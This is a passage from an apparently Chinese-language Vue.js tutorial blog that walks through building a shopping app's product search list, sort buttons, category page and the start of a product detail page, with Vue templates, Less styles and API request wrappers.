class="sort-item"&gt;价格&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="goods-list"&gt;</span><br><span class="line">      &lt;GoodsItem v-for="item in 10" :key="item"&gt;&lt;/GoodsItem&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import GoodsItem from "@/components/GoodsItem.vue";</span><br><span class="line">export default {</span><br><span class="line">  name: "SearchIndex",</span><br><span class="line">  components: {</span><br><span class="line">    GoodsItem,</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.search {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  ::v-deep .van-icon-arrow-left {</span><br><span class="line">    color: #333;</span><br><span class="line">  }</span><br><span class="line">  .tool {</span><br><span class="line">    font-size: 24px;</span><br><span class="line">    height: 40px;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .sort-btns {</span><br><span class="line">    display: flex;</span><br><span class="line">    height: 36px;</span><br><span class="line">    line-height: 36px;</span><br><span class="line">    .sort-item {</span><br><span class="line">      text-align: center;</span><br><span class="line">      flex: 1;</span><br><span class="line">      font-size: 16px;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 商品样式</span><br><span class="line">.goods-list {</span><br><span class="line">  background-color: #f6f6f6;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="渲染"><a class="markdownIt-Anchor" href="#渲染"></a> 渲染</h4><p>封装请求获取商品列表 <code>api/product.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"../utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getProducts</span> = (<span class="params">obj</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> { sortType, sortPrice, categoryId, goodsName, page } = obj;</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/goods/list"</span>, {</span><br><span class="line">    <span class="attr">params</span>: {</span><br><span class="line">      <span class="comment">// all-按综合搜索(默认)，sales-按销量，price-按价格</span></span><br><span class="line">      sortType,</span><br><span class="line">      <span class="comment">// 0-价格从低到高，1-价格从高到低</span></span><br><span class="line">      sortPrice,</span><br><span class="line">      <span class="comment">// 分类id，示例值：0</span></span><br><span class="line">      categoryId,</span><br><span class="line">      <span class="comment">// 商品名称，示例值：酒</span></span><br><span class="line">      goodsName,</span><br><span class="line">      <span class="comment">// 页码，示例值：1</span></span><br><span class="line">      page,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>基于搜索词进行渲染</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="search"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="商品列表"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;van-search</span><br><span class="line">      readonly</span><br><span class="line">      shape="round"</span><br><span class="line">      background="#ffffff"</span><br><span class="line">      :value="queryParam"</span><br><span class="line">      show-action</span><br><span class="line">      @click="$router.push('/search')"</span><br><span class="line">    &gt;</span><br><span class="line">      &lt;template #action&gt;</span><br><span class="line">        &lt;van-icon class="tool" name="apps-o" /&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/van-search&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 排序选项按钮 --&gt;</span><br><span class="line">    &lt;div class="sort-btns"&gt;</span><br><span class="line">      &lt;div</span><br><span class="line">        class="sort-item"</span><br><span class="line">        :class="{ active: currentSortType === 'all' }"</span><br><span class="line">        @click="sortGoods('all')"</span><br><span class="line">      &gt;</span><br><span class="line">        综合</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div</span><br><span class="line">        class="sort-item"</span><br><span class="line">        :class="{ active: currentSortType === 'sales' }"</span><br><span class="line">        @click="sortGoods('sales')"</span><br><span class="line">      &gt;</span><br><span class="line">        销量</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div</span><br><span class="line">        class="sort-item"</span><br><span class="line">        :class="{ active: currentSortType === 'price' }"</span><br><span class="line">        @click="sortGoods('price')"</span><br><span class="line">      &gt;</span><br><span class="line">        价格</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="goods-list"&gt;</span><br><span class="line">      &lt;GoodsItem</span><br><span class="line">        v-for="item in productList"</span><br><span class="line">        :key="item.goods_id"</span><br><span class="line">        :goods="item"</span><br><span class="line">      &gt;&lt;/GoodsItem&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import GoodsItem from "@/components/GoodsItem.vue";</span><br><span class="line">import { getProducts } from "@/api/product";</span><br><span class="line">export default {</span><br><span class="line">  name: "SearchIndex",</span><br><span class="line">  components: {</span><br><span class="line">    GoodsItem,</span><br><span class="line">  },</span><br><span class="line">  computed: {</span><br><span class="line">    // 从router的query中拿到查询参数</span><br><span class="line">    queryParam() {</span><br><span class="line">      // console.log(this.$route.query.search)</span><br><span class="line">      // 如果查询参数不存在就返回一个空字符串</span><br><span class="line">      return this.$route.query.search || "";</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  async created() {</span><br><span class="line">    // 获取商品列表数据</span><br><span class="line">    const res = await getProducts({</span><br><span class="line">      goodsName: this.queryParam,</span><br><span class="line">      // page: this.page</span><br><span class="line">    });</span><br><span class="line">    this.productList = res.data.list.data;</span><br><span class="line">    console.log(res.data.list);</span><br><span class="line">  },</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      currentSortType: "all",</span><br><span class="line">      productList: [],</span><br><span class="line">      page: 1,</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    // 排序商品</span><br><span class="line">    async sortGoods(sortType) {</span><br><span class="line">      // console.log(sortType)</span><br><span class="line">      this.currentSortType = sortType; // 更新当前选中的排序类型</span><br><span class="line">      const res = await getProducts({</span><br><span class="line">        goodsName: this.queryParam,</span><br><span class="line">        sortType: sortType,</span><br><span class="line">      });</span><br><span class="line">      this.productList = res.data.list.data;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.search {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  ::v-deep .van-icon-arrow-left {</span><br><span class="line">    color: #333;</span><br><span class="line">  }</span><br><span class="line">  .tool {</span><br><span class="line">    font-size: 24px;</span><br><span class="line">    height: 40px;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .sort-btns {</span><br><span class="line">    display: flex;</span><br><span class="line">    height: 36px;</span><br><span class="line">    line-height: 36px;</span><br><span class="line">    .sort-item {</span><br><span class="line">      text-align: center;</span><br><span class="line">      flex: 1;</span><br><span class="line">      font-size: 16px;</span><br><span class="line">    }</span><br><span class="line">    .active {</span><br><span class="line">      color: #ee0a24;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 商品样式</span><br><span class="line">.goods-list {</span><br><span class="line">  background-color: #f6f6f6;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="基于分类页面的分类-id-进行渲染"><a class="markdownIt-Anchor" href="#基于分类页面的分类-id-进行渲染"></a> 基于分类页面的分类 id 进行渲染</h4><p>封装请求分类页数据 <code>api/category.js</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"@/utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取分类页数据</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getCategoryData</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/category/list"</span>);</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>完成分类页静态结构</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="category"&gt;</span><br><span class="line">    &lt;!-- 分类 --&gt;</span><br><span class="line">    &lt;van-nav-bar title="全部分类" fixed /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 搜索框 --&gt;</span><br><span class="line">    &lt;van-search</span><br><span class="line">      readonly</span><br><span class="line">      shape="round"</span><br><span class="line">      background="#f1f1f2"</span><br><span class="line">      placeholder="请输入搜索关键词"</span><br><span class="line">      @click="$router.push('/search')"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 分类列表 --&gt;</span><br><span class="line">    &lt;div class="list-box"&gt;</span><br><span class="line">      &lt;div class="left"&gt;</span><br><span class="line">        &lt;van-sidebar v-model="activeKey"&gt;</span><br><span class="line">          &lt;van-sidebar-item</span><br><span class="line">            v-for="(item, index) in list"</span><br><span class="line">            :key="item.category_id"</span><br><span class="line">            :title="item.name"</span><br><span class="line">            :class="{ active: index === activeKey }"</span><br><span class="line">            @click="activeKey = index"</span><br><span class="line">            href="javascript:;"</span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;/van-sidebar&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="right"&gt;</span><br><span class="line">        &lt;div</span><br><span class="line">          @click="$router.push(`/searchlist?categoryId=${item.category_id}`)"</span><br><span class="line">          v-for="item in list[activeKey]?.children"</span><br><span class="line">          :key="item.category_id"</span><br><span class="line">          class="cate-goods"</span><br><span class="line">        &gt;</span><br><span class="line">          &lt;img :src="item.image?.external_url" alt="" /&gt;</span><br><span class="line">          &lt;p&gt;{{ item.name }}&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import { getCategoryData } from "@/api/category";</span><br><span class="line">export default {</span><br><span class="line">  name: "CategoryPage",</span><br><span class="line">  created() {</span><br><span class="line">    this.getCategoryList();</span><br><span class="line">  },</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      activeKey: 0,</span><br><span class="line">      list: [],</span><br><span class="line">      activeIndex: 0,</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    async getCategoryList() {</span><br><span class="line">      const {</span><br><span class="line">        data: { list },</span><br><span class="line">      } = await getCategoryData();</span><br><span class="line">      this.list = list;</span><br><span class="line">      // console.log(this.list)</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">// 主题 padding</span><br><span class="line">.category {</span><br><span class="line">  padding-top: 100px;</span><br><span class="line">  padding-bottom: 50px;</span><br><span class="line">  height: 100vh;</span><br><span class="line">  .list-box {</span><br><span class="line">    height: 100%;</span><br><span class="line">    display: flex;</span><br><span class="line">    .left {</span><br><span class="line">      width: 85px;</span><br><span class="line">      height: 100%;</span><br><span class="line">      background-color: #f3f3f3;</span><br><span class="line">      overflow: auto;</span><br><span class="line">      van-sidebar-item {</span><br><span class="line">        display: block;</span><br><span class="line">        height: 45px;</span><br><span class="line">        line-height: 45px;</span><br><span class="line">        text-align: center;</span><br><span class="line">        color: #444444;</span><br><span class="line">        font-size: 12px;</span><br><span class="line">        &amp;.active {</span><br><span class="line">          color: #fb442f;</span><br><span class="line">          background-color: #fff;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    .right {</span><br><span class="line">      flex: 1;</span><br><span class="line">      height: 100%;</span><br><span class="line">      background-color: #ffffff;</span><br><span class="line">      display: flex;</span><br><span class="line">      flex-wrap: wrap;</span><br><span class="line">      justify-content: flex-start;</span><br><span class="line">      align-content: flex-start;</span><br><span class="line">      padding: 10px 0;</span><br><span class="line">      overflow: auto;</span><br><span class="line"></span><br><span class="line">      .cate-goods {</span><br><span class="line">        width: 33.3%;</span><br><span class="line">        margin-bottom: 10px;</span><br><span class="line">        img {</span><br><span class="line">          width: 70px;</span><br><span class="line">          height: 70px;</span><br><span class="line">          display: block;</span><br><span class="line">          margin: 5px auto;</span><br><span class="line">        }</span><br><span class="line">        p {</span><br><span class="line">          text-align: center;</span><br><span class="line">          font-size: 12px;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 导航条样式定制</span><br><span class="line">.van-nav-bar {</span><br><span class="line">  z-index: 999;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 搜索框样式定制</span><br><span class="line">.van-search {</span><br><span class="line">  position: fixed;</span><br><span class="line">  width: 100%;</span><br><span class="line">  top: 46px;</span><br><span class="line">  z-index: 999;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>修改搜索页列表的查询参数</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">GoodsItem</span> <span class="keyword">from</span> <span class="string">'@/components/GoodsItem.vue'</span></span><br><span class="line"><span class="keyword">import</span> { getProducts } <span class="keyword">from</span> <span class="string">'@/api/product'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">'SearchIndex'</span>,</span><br><span class="line">  <span class="attr">components</span>: {</span><br><span class="line">    <span class="title class_">GoodsItem</span></span><br><span class="line">  },</span><br><span class="line">  <span class="attr">computed</span>: {</span><br><span class="line">    <span class="comment">// 从router的query中拿到查询参数</span></span><br><span class="line">    <span class="title function_">querySearch</span> () {</span><br><span class="line">      <span class="comment">// console.log(this.$route.query.search)</span></span><br><span class="line">      <span class="comment">// 如果查询参数不存在就返回一个空字符串</span></span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">search</span> || <span class="string">''</span></span><br><span class="line">    },</span><br><span class="line">    <span class="title function_">queryCategory</span> () {</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">query</span>.<span class="property">categoryId</span> || <span class="string">''</span></span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">created</span> () {</span><br><span class="line">    <span class="comment">// 获取商品列表数据</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getProducts</span>({</span><br><span class="line">      <span class="attr">categoryId</span>: <span class="variable language_">this</span>.<span class="property">queryCategory</span>,</span><br><span class="line">      <span class="attr">goodsName</span>: <span class="variable language_">this</span>.<span class="property">querySearch</span></span><br><span class="line">      <span class="comment">// page: this.page</span></span><br><span class="line">    })</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">productList</span> = res.<span class="property">data</span>.<span class="property">list</span>.<span class="property">data</span></span><br><span class="line">    <span class="comment">// console.log(res.data.list)</span></span><br><span class="line">    <span class="comment">// console.log(this.querySearch)</span></span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">data</span> () {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="attr">currentSortType</span>: <span class="string">'all'</span>,</span><br><span class="line">      <span class="attr">productList</span>: [],</span><br><span class="line">      <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">methods</span>: {</span><br><span class="line">    <span class="comment">// 排序商品</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">sortGoods</span> (sortType) {</span><br><span class="line">      <span class="comment">// console.log(sortType)</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">currentSortType</span> = sortType <span class="comment">// 更新当前选中的排序类型</span></span><br><span class="line">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getProducts</span>({</span><br><span class="line">        <span class="attr">categoryId</span>: <span class="variable language_">this</span>.<span class="property">queryCategory</span>,</span><br><span class="line">        <span class="attr">goodsName</span>: <span class="variable language_">this</span>.<span class="property">querySearch</span>,</span><br><span class="line">        <span class="attr">sortType</span>: sortType</span><br><span class="line">      })</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">productList</span> = res.<span class="property">data</span>.<span class="property">list</span>.<span class="property">data</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="商品详情页"><a class="markdownIt-Anchor" href="#商品详情页"></a> 商品详情页</h2><h3 id="静态结构"><a class="markdownIt-Anchor" href="#静态结构"></a> 静态结构</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span 